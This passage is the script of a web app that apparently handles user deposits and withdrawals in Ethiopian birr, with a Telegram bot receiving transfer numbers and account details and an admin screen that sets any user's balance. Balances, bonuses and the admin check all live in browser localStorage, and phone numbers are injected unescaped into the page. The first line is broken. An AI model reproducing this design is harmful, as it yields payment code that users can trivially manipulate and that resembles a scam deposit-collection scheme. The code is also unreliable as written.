                                    const             const u = db.users[currentUser];
            if(amt < 200) return showAlert("Limit", "Minimum withdrawal is 200 ETB");
            if(u.balance < amt) return showAlert("Error", "Insufficient funds in your account");

            u.balance -= amt;
            save();
            updateBalanceUI();
            sendTelegram(`💸 WITHDRAWAL\nUser: ${currentUser}\nAmount: ${amt}\nAccount: ${document.getElementById('wd-acc').value}`);
            showAlert("Successful", "Withdrawal request sent to Admin.");
        }

        function submitDeposit() {
            const amt = document.getElementById('recharge-amt').value;
            const ft = document.getElementById('recharge-ft').value;
            if(!amt || !ft) return showAlert("Incomplete", "Enter amount and FT number");
            sendTelegram(`💰 RECHARGE\nUser: ${currentUser}\nAmount: ${amt}\nFT: ${ft}`);
            showAlert("Pending", "Deposit submitted. Admin will verify soon.");
        }

        function claimWelcomeBonus() {
            const u = db.users[currentUser];
            if(u.bonusUsed) return;
            u.balance += 100;
            u.bonusUsed = true;
            save();
            updateBalanceUI();
            showAlert("Gift", i18n[u.lang].welcome);
        }

        // --- Admin Functions ---
        function renderAdmin() {
            const list = document.getElementById('admin-user-list');
            list.innerHTML = "";
            Object.values(db.users).forEach(u => {
                list.innerHTML += `
                    <div style="background:#111; padding:10px; margin:5px; border:1px solid #333;">
                        ${u.ph} | Bal: ${u.balance.toFixed(2)}<br>
                        <button onclick="adminAdjust('${u.ph}')">Set Balance</button>
                    </div>
                `;
            });
        }

        function adminAdjust(ph) {
            let newVal = prompt("Enter new balance for " + ph);
            if(newVal !== null) {
                db.users[ph].balance = parseFloat(newVal);
                save();
                renderAdmin();
            }
        }

        // --- Utils ---
        function save() { localStorage.setItem('wds_data', JSON.stringify(db)); }
        
        function showAlert(title, msg) {
            const a = document.getElementById('customAlert');
            document.getElementById('alertTitle').innerText = title;
            document.getElementById('alertMsg').innerText = msg;
            a.classList.add('show');
            setTimeout(() => a.classList.remove('show'), 3500);
        }

        function sendTelegram(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        }

        function changeLanguage(val) {
            db.users[currentUser].lang = val;
            save();
            updateBalanceUI();
            showAlert("Success", "Language Updated");
        }

        function logout() { localStorage.removeItem('logged_in_user'); location.reload(); }
        function copyToClipboard(txt) { navigator.clipboard.writeText(txt); showAlert("Copied", txt); }

        // Initial Load
        if(currentUser) {
            document.getElementById('page-auth').classList.add('hidden');
            document.getElementById('page-dashboard').classList.remove('hidden');
            document.getElementById('main-nav').classList.remove('hidden');
            if(currentUser === ADMIN_PH) document.getElementById('admin-nav').classList.remove('hidden');
            updateBalanceUI();
            renderProducts();
        }
    </script>
</body>
</html>
